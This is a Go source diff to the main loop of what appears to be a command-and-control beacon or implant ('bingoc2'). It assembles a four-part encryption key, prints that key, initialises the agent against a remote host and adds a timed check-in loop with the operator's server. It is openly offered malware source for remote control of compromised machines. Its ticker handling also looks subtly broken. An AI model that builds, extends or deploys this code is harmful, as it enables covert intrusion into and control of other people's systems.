@@ -1,8 +1,10 @@
 package main
 
 import (
+	"dingo/check"
 	"dingo/initialization"
 	"encoding/binary"
+	"fmt"
 	"os"
 	"strconv"
 	"time"
@@ -22,20 +24,44 @@ var (
 	BEACON_NAME   string = "example beacon"      // name of the beacon this agent is from
 	USERAGENT     string = "bingoc2/1.0.0"       // useragent of callback
 	URI           string = "index.php"           // uri to callback to
-	sKEY          string                         // key for encryption
-	bKEY                 = make([]byte, 32)      // key for encryption in []byte (useable version)
+	sKeya         string                         // key for encryption
+	sKeyb         string
+	sKeyc         string
+	sKeyd         string
 
 	AgentID string = hg.RandomStr(4) // ID of agent (used by server to identify who is calling)
 )
 
 func main() {
 	sleep := SLEEP
-	nKEY, _ := strconv.ParseUint(sKEY, 10, 64)
-	binary.LittleEndian.PutUint64(bKEY, uint64(nKEY))
+
+	nKeya, _ := strconv.ParseUint(sKeya, 10, 64)
+	nKeyb, _ := strconv.ParseUint(sKeyb, 10, 64)
+	nKeyc, _ := strconv.ParseUint(sKeyc, 10, 64)
+	nKeyd, _ := strconv.ParseUint(sKeyd, 10, 64)
+
+	bKey := make([]byte, 0)
+	bKeya := make([]byte, 8)
+	bKeyb := make([]byte, 8)
+	bKeyc := make([]byte, 8)
+	bKeyd := make([]byte, 8)
+
+	binary.BigEndian.PutUint64(bKeya, nKeya)
+	binary.BigEndian.PutUint64(bKeyb, nKeyb)
+	binary.BigEndian.PutUint64(bKeyc, nKeyc)
+	binary.BigEndian.PutUint64(bKeyd, nKeyd)
+
+	bKey = append(bKey, bKeya...)
+	bKey = append(bKey, bKeyb...)
+	bKey = append(bKey, bKeyc...)
+	bKey = append(bKey, bKeyd...)
+
+	fmt.Println(bKey)
 
 	// initiliaze sessions
-	err := initialization.InitAgent(RHOST, RPORT, URI, sleep, JITTER, LISTENER_NAME, AgentID, USERAGENT, bKEY, BEACON_NAME)
+	err := initialization.InitAgent(RHOST, RPORT, URI, sleep, JITTER, LISTENER_NAME, AgentID, USERAGENT, bKey, BEACON_NAME)
 	if err != nil {
+		fmt.Println(err)
 		os.Exit(1)
 	}
 
@@ -47,6 +73,8 @@ func main() {
 
 	// checkin with server based on ticker
 	for range ticker.C {
-
+		check.CheckIn(RHOST, RPORT, URI, &sleep, JITTER, LISTENER_NAME, AgentID, USERAGENT, bKey, BEACON_NAME)
+		// change ticker if tasking changed sleep
+		ticker.Interval = time.Second * time.Duration(sleep)
 	}
 }
